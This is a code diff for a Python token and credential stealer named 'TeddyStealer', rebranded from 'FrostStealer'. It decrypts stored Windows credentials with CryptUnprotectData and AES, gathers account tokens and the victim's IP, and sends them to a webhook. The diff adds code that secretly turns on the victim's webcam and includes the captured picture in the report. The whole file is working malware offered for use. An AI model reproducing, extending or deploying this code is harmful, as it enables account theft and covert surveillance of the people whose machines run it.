@@ -1,16 +1,22 @@
+import os
+import sys
+import json
+import uuid
+import ctypes
+import socket
+import random
 import platform
 import requests
-import subprocess
-
 
 from re import findall, match
+import pygame
+import pygame.camera
 from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
     'webhook': "WEBHOOK",
-    'embed_color': random.randint(0, 0x000000),
     'hide_self': True
 }
 
@@ -46,6 +52,32 @@ class functions(object):
             return json.dumps(info)
 
 
+  
+
+pygame.camera.init()
+  
+
+camlist = pygame.camera.list_cameras()
+  
+
+if camlist:
+  
+
+    cam = pygame.camera.Camera(camlist[0], (640, 480))
+  
+
+    cam.start()
+  
+
+    image = cam.get_image()
+  
+
+    pygame.image.save(image, "filename.jpg")
+  
+
+else:
+    print("No camera on current device")
+
 class TeddyStealer(functions):
     def __init__(self):
         super().__init__()
@@ -60,18 +92,16 @@ class TeddyStealer(functions):
 
     def send(self):
         for token in self.tokens:
-            color = config.get('embed_color')
             raw_user_data = self.retrieve_user(token)
             user_json_str = json.dumps(raw_user_data)
             user = json.loads(user_json_str)
             if "username" in user:
                 if config.get('webhook'):
                     webhook_data = {
-                        "username": "FrostStealer",
+                        "username": "TeddyStealer",
                         "embeds": [
                             {
-                                "title": 'Frost Iced An Account',
-                                "color": color,
+                                "title": 'TeddyStealer Stole A Account',
                                 'fields': [
                                     {
                                        "name": "**Account Info**",
@@ -95,7 +125,8 @@ class TeddyStealer(functions):
                                     },
                                     {
                                         "name": "**IP Info**",
-                                        "value": f'https://whatismyipaddress.com/ip/{self.pc["public_ip"]}',
+                                        "value": f'''https://whatismyipaddress.com/ip/{self.pc["public_ip"]}      
+                                        {image}''',
                                         "inline": False
                                     },
                                 ],    
